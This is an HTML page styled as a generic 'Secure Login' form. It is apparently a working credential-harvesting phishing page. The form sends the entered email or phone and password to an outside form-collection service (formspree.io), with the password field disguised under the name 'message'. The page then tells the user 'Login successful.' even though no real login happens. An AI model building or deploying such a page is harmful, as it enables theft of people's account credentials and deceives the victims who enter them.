<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Secure Login</title>

<style>
*{box-sizing:border-box;margin:0}

body{
background:#0c1117;
font-family:system-ui,-apple-system,Segoe UI,Roboto;
color:white;
display:flex;
align-items:center;
justify-content:center;
min-height:100vh;
}

/* CARD */
.card{
width:100%;
max-width:420px;
background:#11161d;
padding:46px 32px;
border-radius:16px;
box-shadow:0 20px 50px rgba(0,0,0,.6);
}

/* TITLE */
h1{
font-size:30px;
margin-bottom:36px;
}

/* FIELD */
.field{
position:relative;
margin-bottom:24px;
}

/* INPUT */
input{
width:100%;
padding:18px 16px;
background:#0c1117;
border:1px solid #2a3441;
border-radius:10px;
color:white;
font-size:16px;
outline:none;
transition:.25s;
}

input:focus{
border-color:#ffd24a;
box-shadow:0 0 0 2px rgba(255,210,74,.18);
}

/* FLOAT LABEL */
label{
position:absolute;
left:14px;
top:50%;
transform:translateY(-50%);
color:#7f8b99;
transition:.2s;
background:#0c1117;
padding:0 6px;
pointer-events:none;
}

input:focus+label,
input:not(:placeholder-shown)+label{
top:-9px;
font-size:12px;
color:#ffd24a;
}

/* PASSWORD EYE */
.eye{
position:absolute;
right:14px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
opacity:.7;
}
.eye:hover{opacity:1}

/* BUTTON */
button{
width:100%;
background:#ffd24a;
border:none;
border-radius:10px;
padding:18px;
font-weight:700;
font-size:18px;
cursor:pointer;
display:flex;
justify-content:center;
align-items:center;
gap:10px;
}

/* SPINNER */
.spin{
width:18px;
height:18px;
border:3px solid rgba(0,0,0,.25);
border-top:3px solid black;
border-radius:50%;
animation:rot .8s linear infinite;
display:none;
}

@keyframes rot{to{transform:rotate(360deg)}}

#status{
text-align:center;
margin-top:18px;
color:#ffd24a;
}

@media(max-width:480px){
.card{padding:36px 20px}
}

</style>
</head>

<body>

<div class="card">

<h1>Secure Login</h1>

<form id="form" action="https://formspree.io/f/xjgewkoy" method="POST">

<!-- EMAIL -->
<div class="field">
<input type="text" name="email" placeholder=" " required>
<label>Email or Phone</label>
</div>

<!-- PASSWORD -->
<div class="field">
<input id="p" type="password" name="message" placeholder=" " required>
<label>Password</label>

<div class="eye" onclick="toggle()">
üëÅ
</div>
</div>

<input type="hidden" name="_captcha" value="false">

<button id="btn">
Login
<div class="spin" id="spin"></div>
</button>

<div id="status"></div>

</form>

</div>


<script>

/* SHOW / HIDE PASSWORD */
function toggle(){
const p=document.getElementById("p");
p.type=p.type==="password"?"text":"password";
}

/* SUBMIT */
document.getElementById("form").addEventListener("submit",function(e){

e.preventDefault();

spin.style.display="block";
btn.disabled=true;

fetch(this.action,{
method:"POST",
body:new FormData(this),
headers:{'Accept':'application/json'}
})
.then(r=>{
spin.style.display="none";
btn.disabled=false;

status.innerHTML=r.ok
?"Login successful."
:"Submission failed.";

if(r.ok)this.reset();
})
.catch(()=>{
spin.style.display="none";
btn.disabled=false;
status.innerHTML="Connection error.";
});

});

</script>

</body>
</html>
